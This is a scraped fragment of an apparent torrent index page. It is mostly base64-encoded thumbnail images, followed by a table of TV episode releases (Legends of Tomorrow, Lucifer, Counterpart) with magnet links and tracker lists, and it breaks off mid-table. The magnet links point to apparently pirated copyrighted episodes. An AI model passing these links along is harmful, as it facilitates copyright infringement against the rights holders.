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' style="margin: 5px;" /></a></div></div><div class="dataList"><div class="card"><a href="/designated-survivor-i5296406/" title="Designated Survivor"><img src='data:image/png;base64,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' style="margin: 5px;" /></a></div></div></div></div>
<table class="torrenttable" width="100%">
<tr style="background-color: transparent;">
<td class="colhead" align="left">TORRENT</td>
<td class="colhead" align="left">&nbsp;</td>
<td class="colhead" align="center">UPLOADED</td><td class="colhead" align="center">SIZE</td><td class="colhead" align="right">SEEDS</td>
<td class="colhead" align="right">LEECHS</td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/dcs-legends-of-tomorrow-s03e15-hdtv-x264-sva-eztv-t272847.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/dcs-legends-of-tomorrow-s03e15-hdtv-x264-sva-eztv-t272847.html" "><b>DCs Legends of Tomorrow S03E15 HDTV x264-SVA EZTV</b></a> <small><i>by <a href='/perfil/eztv/'>eztv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a id="272847" class="jTip icomment icon16" name="Comentários:" href="/dcs-legends-of-tomorrow-s03e15-hdtv-x264-sva-eztv-t272847/comentarios" onclick="window.location='/dcs-legends-of-tomorrow-s03e15-hdtv-x264-sva-eztv-t272847.html?tab=comentarios'">
<em class="iconvalue">1</em>
<span></span>
</a>
</span>
<a class="iverified icon16" href="/dcs-legends-of-tomorrow-s03e15-hdtv-x264-sva-eztv-t272847.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:C6CE5C38B46AFB91C54573978215CAA7320A88CE&dn=DCs Legends of Tomorrow S03E15 HDTV x264-SVA EZTV&xl=315175218&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://p4p.arenabg.com:1337&tr=http://tracker.mg64.net:6881/announce&tr=http://mgtracker.org:2710/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://open.acgtracker.com:1096/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=http://tracker.files.fm:6969/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/dcs-legends-of-tomorrow-s03e15-hdtv-x264-sva-eztv-t272847/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 10:45:48">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>300.57 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2 257</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>282</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/lucifer-s03e18-hdtv-x264-killers-eztv-t271785.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/lucifer-s03e18-hdtv-x264-killers-eztv-t271785.html" "><b>Lucifer S03E18 HDTV x264-KILLERS EZTV</b></a> <small><i>by <a href='/perfil/eztv/'>eztv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/lucifer-s03e18-hdtv-x264-killers-eztv-t271785.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:EA08104B7157BD66F97CFD30A1232557BCCD151F&dn=Lucifer S03E18 HDTV x264-KILLERS EZTV&xl=268933898&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://eddie4.nl:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://9.rarbg.to:2710&tr=udp://p4p.arenabg.com:1337&tr=udp://public.popcorn-tracker.org:6969&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=udp://mgtracker.org:6969&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://open.acgtracker.com:1096/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=http://tracker.files.fm:6969/announce&tr=udp://asnet.pw:2710/announce&tr=udp://p4p.arenabg.ch:1337" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/lucifer-s03e18-hdtv-x264-killers-eztv-t271785/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 02:58:30">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>256.48 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2 805</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>284</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat700 icon16" href="/counterpart-s01e09-web-h264-deflate-eztv-t271078.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/counterpart-s01e09-web-h264-deflate-eztv-t271078.html" "><b>Counterpart S01E09 WEB H264-DEFLATE EZTV</b></a> <small><i>by <a href='/perfil/eztv/'>eztv</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/counterpart-s01e09-web-h264-deflate-eztv-t271078.html" title="torrent uploaded by a verified user">
<span></span>
</a>
